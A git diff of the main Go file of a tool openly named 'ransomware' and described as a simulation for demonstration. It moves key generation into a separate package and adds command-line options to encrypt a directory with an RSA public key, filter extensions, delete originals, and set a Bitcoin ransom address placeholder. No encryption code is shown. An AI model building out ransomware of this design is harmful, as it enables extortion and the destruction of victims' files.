@@ -3,61 +3,17 @@ package main
 import (
 	"log"
 	"os"
-	"path/filepath"
 	"time"
 
 	"github.com/common-nighthawk/go-figure"
-	"github.com/marmos91/ransomware/crypto"
-	"github.com/marmos91/ransomware/ransomfs"
+	"github.com/marmos91/ransomware/ransomcli"
 	"github.com/urfave/cli/v2"
 )
 
 const APP_NAME = "ransomware"
 const APP_DESCRIPTION = "A simple demonstration tool to simulate a ransomware attack"
 const APP_VERSION = "v1.0.0"
-const AES_KEY_SIZE = 32
-const RSA_KEY_SIZE = 2048
-const PUBLIC_KEY_NAME = "pub.pem"
-const PRIVATE_KEY_NAME = "priv.pem"
-
-func createKeys(ctx *cli.Context) error {
-	path := ctx.String("path")
-
-	rsaKeypair, err := crypto.NewRandomRsaKeypair(RSA_KEY_SIZE)
-
-	if err != nil {
-		return err
-	}
-
-	absolutePath, err := filepath.Abs(path)
-
-	if err != nil {
-		return err
-	}
-
-	log.Println("Generated random keys at", absolutePath)
-	log.Printf("Hide your %s key!", PRIVATE_KEY_NAME)
-
-	privatePemContent := crypto.ExportRsaPrivateKeyAsPemStr(rsaKeypair.Private)
-	publicPemContent, err := crypto.ExportRsaPublicKeyAsPemStr(rsaKeypair.Public)
-
-	if err != nil {
-		return err
-	}
-
-	ransomfs.WriteStringToFile(filepath.Join(path, PRIVATE_KEY_NAME), privatePemContent)
-	ransomfs.WriteStringToFile(filepath.Join(path, PUBLIC_KEY_NAME), publicPemContent)
-
-	return nil
-}
-
-func encrypt(ctx *cli.Context) error {
-	return nil
-}
-
-func decrypt(ctx *cli.Context) error {
-	return nil
-}
+const BITCOIN_ADDRESS = "BITCOIN_ADDRESS"
 
 func SplashScreen(silent bool) func(*cli.Context) error {
 	return func(ctx *cli.Context) error {
@@ -105,7 +61,7 @@ func main() {
 						Value:   ".",
 					},
 				},
-				Action: createKeys,
+				Action: ransomcli.CreateKeys,
 			},
 			{
 				Name:    "encrypt",
@@ -113,13 +69,44 @@ func main() {
 				Aliases: []string{"e"},
 				Flags: []cli.Flag{
 					&cli.StringFlag{
-						Name:    "path",
-						Aliases: []string{"p"},
-						Usage:   "Runs the tool on a directory",
+						Name:     "path",
+						Aliases:  []string{"p"},
+						Usage:    "Runs the tool on a directory",
+						Required: true,
+					},
+					&cli.StringFlag{
+						Name:     "publicKey",
+						Usage:    "Loads the provided RSA public key in PEM format",
+						Required: true,
+					},
+					&cli.StringFlag{
+						Name:  "extBlacklist",
+						Usage: "the extension to blacklist",
+						Value: ".enc",
+					},
+					&cli.StringFlag{
+						Name:  "extWhitelist",
+						Usage: "the extension to whitelist",
+						Value: "",
+					},
+					&cli.BoolFlag{
+						Name:  "skipHidden",
+						Usage: "skips hidden folders",
+						Value: false,
+					},
+					&cli.BoolFlag{
+						Name:  "dryRun",
+						Usage: "encrypts files without deleting originals",
+						Value: false,
+					},
+					&cli.StringFlag{
+						Name:  "encSuffix",
+						Usage: "defines the suffix to add to encrypted files",
+						Value: ".enc",
 					},
 				},
 				Before: SplashScreen(silent),
-				Action: encrypt,
+				Action: ransomcli.Encrypt,
 			},
 			{
 				Name:    "decrypt",
@@ -127,26 +114,32 @@ func main() {
 				Aliases: []string{"d"},
 				Flags: []cli.Flag{
 					&cli.StringFlag{
-						Name:    "path",
-						Aliases: []string{"c"},
-						Usage:   "Runs the tool on a directory",
+						Name:     "path",
+						Aliases:  []string{"c"},
+						Usage:    "Runs the tool on a directory",
+						Required: true,
+					},
+					&cli.StringFlag{
+						Name:     "privateKey",
+						Usage:    "Loads the provided RSA private key in PEM format",
+						Required: true,
+					},
+					&cli.BoolFlag{
+						Name:  "dryRun",
+						Usage: "decrypts files without deleting encrypted versions",
+						Value: false,
+					},
+					&cli.StringFlag{
+						Name:  "encSuffix",
+						Usage: "defines the suffix to add to encrypted files",
+						Value: ".enc",
 					},
 				},
 				Before: SplashScreen(silent),
-				Action: decrypt,
+				Action: ransomcli.Decrypt,
 			},
 		},
 	}
-
-	// walkErr := ransomfs.WalkFilesWithExtFilter(".", []string{".go", ".sample", ".md"}, true, func(path string, info fs.FileInfo) error {
-	// 	fmt.Println(path)
-
-	// 	return nil
-	// })
-
-	// if walkErr != nil {
-	// 	log.Println(walkErr)
-	// }
 
 	if err := app.Run(os.Args); err != nil {
 		log.Fatal(err)
